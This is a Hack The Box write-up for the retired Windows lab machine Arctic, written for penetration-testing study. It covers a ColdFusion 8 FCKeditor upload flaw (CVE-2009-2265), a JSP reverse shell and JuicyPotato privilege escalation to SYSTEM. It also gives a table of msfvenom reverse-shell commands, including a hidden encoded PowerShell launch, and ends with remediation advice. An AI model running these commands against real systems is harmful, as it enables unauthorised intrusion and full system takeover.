# Arctic — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | 🪟 Windows Server 2008 R2 Standard |
| **Difficulty** | 🟢 Easy |
| **Owned** | 20/09/2026 |
| **Author** | Maksym S |

> ⚠️ Retired machine. Flags are redacted (`<redacted>`) in line with the HTB Terms of Service.

---

## 📌 Summary

**Arctic** exposes an ancient **Adobe ColdFusion 8** install on a non-standard port. A directory
traversal in its bundled FCKeditor file manager (CVE-2009-2265) allows an arbitrary file write into
a web-executable directory — dropping a JSP reverse shell gets a low-privilege foothold, and the
service account's `SeImpersonatePrivilege` is then abused with JuicyPotato for SYSTEM.

**Attack path:** `ColdFusion 8 / FCKeditor directory traversal (CVE-2009-2265) → JSP webshell → SeImpersonatePrivilege abuse (JuicyPotato) → SYSTEM`

---

## 🔍 1. Reconnaissance

### Port scan

```
PORT      STATE SERVICE REASON
135/tcp   open  msrpc   syn-ack ttl 127
8500/tcp  open  fmtp    syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127
```

UDP: no open ports.

### Service/version scan

```
PORT      STATE SERVICE REASON          VERSION
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
8500/tcp  open  http    syn-ack ttl 127 JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port 8500 (JRun/Adobe ColdFusion's default management port) is the only interesting web surface —
browsing it revealed an Adobe ColdFusion 8 install.

### RPC enumeration (135)

```
impacket-rpcdump 10.129.72.147 -p 135
```

96 endpoints enumerated — mostly stock Windows Server 2008 R2 services (Task Scheduler,
Spooler, SAMR, EventLog). Nothing exploitable found here; the real way in was the ColdFusion
instance on 8500.

---

## 🧭 2. Enumeration

**Port 8500 — Adobe ColdFusion 8.** Version-fingerprinted from the exposed admin/management
interface. ColdFusion 8 ships a bundled **FCKeditor** rich-text editor whose file-manager
connector (`/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm`) is
vulnerable to a directory-traversal arbitrary file write — **CVE-2009-2265**.

---

## 🎯 3. Foothold

**Exploit:** [exploit-db 50057](https://www.exploit-db.com/exploits/50057) — uploads an
`msfvenom`-generated JSP reverse shell (`java/jsp_shell_reverse_tcp`) via a null-byte-terminated
`CurrentFolder` path in the FCKeditor upload connector, landing it directly in a web-servable
path, then requests the uploaded file over HTTP to trigger it:

```python
# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)
# CVE : CVE-2009-2265
...
request = urllib.request.Request(
    f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/'
    f'upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00',
    data=data)
...
```

Manually confirmed the upload path serves executable content by checking
`http://10.129.72.147:8500/userfiles/file/` — the connector renames uploaded files, so the exact
uploaded filename has to be recovered from that directory listing before triggering it.

```
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

`whoami /all` from this shell confirmed `SeImpersonatePrivilege: Enabled` on the `arctic\tolis`
service account — the same Potato-attack setup as [Devel](../Devel/README.md).

---

## ⬆️ 4. Privilege Escalation — ColdFusion Service Account → SYSTEM (JuicyPotato)

**Technique:** `SeImpersonatePrivilege` abuse via JuicyPotato (MITRE [T1134.001](https://attack.mitre.org/techniques/T1134/001/) — Token Impersonation), same class of attack as Devel, executed here through a ColdFusion-hosted file upload instead of FTP.

### Execution flow

1. **Upload a PowerShell reverse-shell script** through the same FCKeditor upload primitive used
   for the initial JSP shell (reusing the arbitrary-file-write bug to drop a `.ps1` this time
   instead of a `.jsp`).
2. **Upload `JuicyPotato.exe`** the same way.
3. From the JSP webshell, **launch the PowerShell one-liner via JuicyPotato**, using the BITS
   CLSID (present on nearly all Windows builds, same one used on Devel):

```
.\JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * ^
  -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ^
  -a "-nop -ep bypass -f C:\ColdFusion8\wwwroot\userfiles\file\r1.ps1"
```

4. **Catch the SYSTEM shell** on the listener:

```
penelope -p 1340
[+] [New Reverse Shell] => ARCTIC 10.129.72.147 Microsoft_Windows_Server_2008_R2_Standard_-x64-based_PC 👤 nt authority\system

PS C:\Windows\system32> whoami /all
USER INFORMATION
----------------
User Name           SID
=================== ========
nt authority\system S-1-5-18
...
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeAssignPrimaryTokenPrivilege   Replace a process level token             Enabled
SeDebugPrivilege                Debug programs                            Enabled
```

---

## 🚩 Proof

```
PS C:\Users> type tolis\Desktop\user.txt
<redacted>
PS C:\Users> type Administrator\Desktop\root.txt
<redacted>
```

```
user.txt (tolis):          <redacted>
root.txt (Administrator):  <redacted>
```

---

## 🔬 Research notes

This box's note didn't end in a formal `Questions:` block, but flagged one real friction point
worth resolving so it doesn't cost time again — researched with the same gather-then-verify
method as other writeups (`.claude/skills/vault-research/references/`).

### "Need to use msfvenom for shell generation and [work out] how to spawn a rev shell from cmd.exe — huge waste of time"

Two separate payload-delivery problems actually showed up on this box, and conflating them is
likely what cost the time:

**1) The initial JSP shell *was* generated with msfvenom** — this one's straightforward and needs
no further "spawning" step, because a JSP reverse shell is self-contained: once the ColdFusion/JRun
server serves the uploaded `.jsp`, requesting it over HTTP executes it directly. There's no
separate cmd.exe invocation required.

**2) The JuicyPotato-stage payload was *not* generated with msfvenom** — it was a hand-written
PowerShell TCP client one-liner, launched via `powershell.exe -nop -ep bypass -f r1.ps1` as the
`-p`/`-a` target of JuicyPotato. This is the step that actually needs "spawning from cmd.exe" (or,
more precisely, from JuicyPotato's own process-creation call) — and it's a different payload style
entirely from the JSP shell.

**Quick reference for both patterns going forward** (verified against Rapid7's own official
msfvenom documentation):

| Goal | Command | Execution |
|---|---|---|
| Self-contained JSP shell (as used here) | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -o shell.jsp` | Upload it anywhere the app server executes JSP, then just request it over HTTP — no separate launch step |
| Windows EXE payload | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe` | Drop it and run it directly (double-click, `shell.exe` from cmd.exe, or a service/scheduled-task pointing at it) |
| Ready-to-run `.cmd` (no separate interpreter call needed) | `msfvenom -p cmd/windows/reverse_powershell LHOST=<ip> LPORT=<port> -f psh-cmd -o shell.cmd` | Run `shell.cmd` directly from cmd.exe |
| Raw PowerShell script (what JuicyPotato actually launched here) | Hand-written or `msfvenom -p windows/powershell_reverse_tcp -f psh -o shell.ps1` | `powershell.exe -nop -ep bypass -f shell.ps1`, or base64: `powershell -nop -w hidden -enc <base64>` |

**Takeaway:** msfvenom is for generating the *payload file*; how you *launch* it depends entirely
on the payload format chosen (`exe` runs itself, `psh`/`.ps1` needs `powershell.exe -f`, `psh-cmd`
runs itself under `cmd.exe`). The friction on this box came from needing a hand-rolled PowerShell
one-liner (not an msfvenom output) specifically because JuicyPotato's `-p`/`-a` flags need a
concrete *program* to launch (`powershell.exe`) plus its *arguments* (`-f script.ps1`), rather than
a single self-executing binary.

**Sources:**
- [Rapid7/Metasploit — official msfvenom usage docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [GitHub Advisory Database — GHSA-4849-cfqq-r8pq (CVE-2009-2265)](https://github.com/advisories/GHSA-4849-cfqq-r8pq)

### Addendum: the "official" privesc path — MS10-059 / "Chimichurri"

JuicyPotato was used above, but Arctic's textbook/official privilege-escalation route is a
different bug entirely, worth knowing since the box's OS predates JuicyPotato's usual targets:

**MS10-059** is a Microsoft Security Bulletin ("Vulnerabilities in the Tracing Feature for
Services Could Allow Elevation of Privilege", KB982799) affecting **Rtutils.dll** (the RAS
Tracing Utility) on Windows Vista SP2, Server 2008, Windows 7, and Server 2008 R2 — matching
Arctic's Server 2008 R2 build. Two CVEs: **CVE-2010-2554** (incorrect registry ACLs on
tracing-related keys) and **CVE-2010-2555** (memory corruption from unsafe allocation when
processing crafted long strings) — either lets a local attacker run code as SYSTEM.

**Correcting a premise:** "MS10-059 exploit metasploit" doesn't refer to a native Metasploit
module — a direct check of Rapid7's own module database returns **zero results** for
MS10-059/Chimichurri. What's commonly called "the MS10-059 exploit" is a **standalone,
third-party compiled PoC binary** nicknamed *Chimichurri* (from community collections like
`egre55/windows-kernel-exploits`), run directly on the target rather than invoked via
`use exploit/...` in `msfconsole`. It's associated with Metasploit only at the workflow level —
typically delivered *through* an existing Meterpreter session (upload, or a PowerShell
`wget`-style download) and then executed directly, popping a reverse shell as
`NT AUTHORITY\SYSTEM` rather than elevating in-place.

**Sources:**
- [Microsoft Support — MS10-059 official bulletin](https://support.microsoft.com/en-us/topic/ms10-059-vulnerabilities-in-the-tracing-feature-for-services-could-allow-an-elevation-of-privilege-ebc5aca9-39f2-9c6a-fe20-bab9d27eb710)
- [Rapid7 Vulnerability & Exploit Database — 0 results for MS10-059/Chimichurri](https://www.rapid7.com/db/?q=ms10-059&type=metasploit)
- [egre55/windows-kernel-exploits — Chimichurri source](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri)
- [HTB Forums — "For Those struggling with Priv Esc in Arctic"](https://forum.hackthebox.com/t/for-those-struggling-with-priv-esc-in-arctic/3051)

---

## 🧠 Lessons Learned

- **What worked:** ColdFusion/FCKeditor's directory-traversal file upload is a full foothold once
  you can guess/enumerate the renamed uploaded filename from the servable directory listing.
- **Rabbit holes:** the hash values found during loot collection (`4AD16D45A25...`,
  `4181C5AA12F1...`) turned out to be a dead end — logged here as "rabbit hole" in the original
  notes, not pursued further since JuicyPotato already delivered SYSTEM.
- **OSCP takeaway:** the same `SeImpersonatePrivilege`-abuse pattern as Devel — recognize this
  privilege immediately on any Windows service-account foothold, and remember that the exploit
  payload for the Potato stage has to be something JuicyPotato's `-p <program> -a <args>` can
  launch directly (an interpreter + script, or a self-contained EXE), not just any msfvenom output.
- **Why two valid privesc paths exist on the same box:** JuicyPotato and MS10-059/Chimichurri are
  different *kinds* of bug that happen to coexist because this OS build was frozen unpatched.
  JuicyPotato abuses an intentional Windows *privilege* (generic — applies to almost any service
  account with `SeImpersonatePrivilege`, independent of patch level). MS10-059 is one specific,
  narrow-window kernel/registry-ACL CVE tied to this exact OS build. Old, deliberately-unpatched
  boxes routinely stack several unrelated bugs like this — there's rarely a single "correct" path,
  which is exactly why broad enumeration (`whoami /priv` *and* `wmic qfe list`/`systeminfo`) matters
  more than assuming one technique.

---

## 🛡️ Remediation

| Finding | Severity | Fix |
|---------|:--------:|-----|
| Adobe ColdFusion 8 (EOL, unpatched FCKeditor) | Critical | Upgrade ColdFusion / patch or remove the bundled FCKeditor; apply the CVE-2009-2265 fix (FCKeditor ≥ 2.6.4.1) |
| FCKeditor upload connector reachable pre-auth | Critical | Restrict or disable the `/CFIDE/scripts/ajax/FCKeditor/` connector entirely if the rich-text editor isn't needed |
| `SeImpersonatePrivilege` held by the ColdFusion service account | High | Run the service with least privilege; patch to a Windows/DCOM version where the Potato-family NTLM-reflection trick is mitigated |

---

## 🔗 References

- [exploit-db 50057 — Adobe ColdFusion 8 RCE](https://www.exploit-db.com/exploits/50057)
- [GitHub Advisory Database — GHSA-4849-cfqq-r8pq (CVE-2009-2265)](https://github.com/advisories/GHSA-4849-cfqq-r8pq)
- [MITRE ATT&CK T1134.001 — Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)
- [ohpe/juicy-potato — README](https://github.com/ohpe/juicy-potato)
- [Rapid7/Metasploit — official msfvenom usage docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
